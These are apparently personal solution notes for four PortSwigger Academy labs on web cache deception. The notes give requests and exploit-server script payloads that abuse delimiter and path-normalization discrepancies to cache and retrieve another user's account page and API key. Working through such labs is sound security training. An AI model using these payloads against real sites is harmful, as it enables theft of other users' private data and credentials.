## Lab: Exploiting path mapping for web cache deception
To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

#### Required knowledge

To solve this lab, you'll need to know:

- How regex endpoints map URL paths to resources.
- How to detect and exploit discrepancies in the way the cache and origin server map URL paths.

These points are covered in our Web cache deception Academy topic.

```plaintext
Select the request to /my-account
Try to add /something.js and check the response header to be sure that the Cache was miss and the request had been cached by resend this request in 30s after send the first request.

Go to exploit server and edit the body to something like below:
<script>document.location="https://0acc00af04bcab5b807103af001e0037.web-security-academy.net/my-account/filess.js"</script>

Then send it to the victim, after that access this link to retrieve the cached response of the carlos user.
Got the access token
```
## Lab: Exploiting path delimiters for web cache deception

To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

#### Required knowledge

To solve this lab, you'll need to know:

- How to identify discrepancies in how the cache and origin server interpret characters as delimiters.
- How delimiter discrepancies can be used to exploit a static directory cache rule.

These points are covered in our Web cache deception Academy topic.

```plaintext
Solution:
First send the /my-account request to Intruder to find the delimiter
Paste the Web cache deception lab delimiter list as the payload then run the Intruder.

The payload is something like:
GET /my-account$$aaaa HTTP/2

Look for the delimiter that return a 200 response.

Then we can use that delimiter to run a web cache deception attack
Check it by send a request to /my-account like
GET /my-account;abc.js
And check if the request was cached or not

Go to the exploit server and edit the body:
<script>document.location="https://0acc00af04bcab5b807103af001e0037.web-security-academy.net/my-account;filess.js"</script>

Then send it to the victim, after that access this link to retrieve the cached response of the carlos user.
Got the access token
```
## Lab: Exploiting origin server normalization for web cache deception

To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

#### Required knowledge

To solve this lab, you'll need to know:

- How to identify whether the cache and origin server normalize the URL path.
- How to identify static directory cache rules.
- How to exploit normalization by the origin server.

These points are covered in our Web cache deception Academy topic.

```plaintext
Solution:

First, send the /my-account request to Repeater and try to run a Path Traversal attack like
GET /resources/..%2fmy-account HTTP/2
We got a 200 success status code

Next go to and resources start with /resources path prefix and try to change the file extension or remove the file extension.

We can see that cache server work on /resources prefix path.

Try to access the /my-account page with /resources
GET /resources/..%2f/my-account HTTP/2

We got a 200 success status code with /my-account page

Change the body in the Exploit server to
<script>document.location="https://0a19009f03a93dd781be1139008f0046.web-security-academy.net/resources/..%2f/my-account?something"</script>

Send to the victim and access into this link to get the cached response for the carlos user.
```
## Lab: Exploiting cache server normalization for web cache deception

To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

#### Required knowledge

To solve this lab, you'll need to know:

- How to identify whether the cache and origin server normalize the URL path.
- How to identify static directory cache rules.
- How to identify discrepancies in how the cache and origin server interpret characters as delimiters.
- How to exploit normalization by the cache server.

These points are covered in our Web cache deception Academy topic.

```plaintext
Solution:

First send /my-account request to Intruder and try to find the delimiter
(Remember to turn off auto URL-encode in Payload Setting)

We got ?, #, %3F, %23

Detecting normalization by the cache server
Use the request access resources to check

GET /resources/..%2flabheader/js/submitSolution.js HTTP/2 -> Not cached
GET /resources/labheader/..%2fjs/submitSolution.js HTTP/2 -> Cached

The cache server decodes the slash resolves the dot-segment during normalization.

The cache server work on path prefix /resources/labheader/

Try:
GET /resources/..%2f/my-account HTTP/2 -> Not working
GET /my-account%2f%2e%2e%2fresources/submitSolution.js HTTP/2 -> 404, not caching

Combine all

GET /my-account%3F2f%2e%2e%2fresources/submitSolution.js HTTP/2 -> 200, not cache

GET /my-account%23%2f%2e%2e%2fresources/submitSolution.js HTTP/2 -> 200, cached
```
